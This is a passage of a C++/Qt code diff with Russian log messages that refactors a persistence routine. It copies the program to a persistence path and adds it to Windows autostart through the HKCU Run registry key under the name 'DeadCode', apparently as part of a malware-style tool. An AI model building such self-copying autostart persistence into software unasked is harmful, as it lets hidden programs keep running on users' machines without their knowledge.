+                emitLog("Ошибка: Не удалось скопировать файл для персистентности в " + 
+                        QString::fromStdString(persistPath));
+            }
+        } catch (const std::filesystem::filesystem_error& e) {
+            emitLog("Ошибка файловой системы при копировании для персистентности: " + 
+                    QString::fromStdString(e.what()));
+        } catch (const std::exception& e) {
+            emitLog("Неизвестная ошибка при копировании для персистентности: " + 
+                    QString::fromStdString(e.what()));
         }
     }
 
+    // Добавление в автозагрузку через реестр
     if (config.autoStart) {
         HKEY hKey;
-        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
+                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                                   0, KEY_SET_VALUE, &hKey);
+        if (result == ERROR_SUCCESS) {
             std::string appName = "DeadCode";
-            if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)persistPath.c_str(), persistPath.length() + 1) == ERROR_SUCCESS) {
-                emitLog("Программа добавлена в автозагрузку через реестр");
+            if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, 
+                              reinterpret_cast<const BYTE*>(persistPath.c_str()), 
+                              static_cast<DWORD>(persistPath.length() + 1)) == ERROR_SUCCESS) {
+                emitLog("Программа добавлена в автозагрузку через реестр: " + 
+                        QString::fromStdString(appName));
             } else {
-                emitLog("Ошибка: Не удалось добавить программу в автозагрузку через реестр");
+                emitLog("Ошибка: Не удалось добавить программу в автозагрузку через реестр. Код ошибки: " + 
+                        QString::number(GetLastError()));
             }
             RegCloseKey(hKey);
         } else {
-            emitLog("Ошибка: Не удалось открыть ключ реестра для автозагрузки");
+            emitLog("Ошибка: Не удалось открыть ключ реестра для автозагрузки. Код ошибки: " + 
+                    QString::number(result));
         }
     }
 
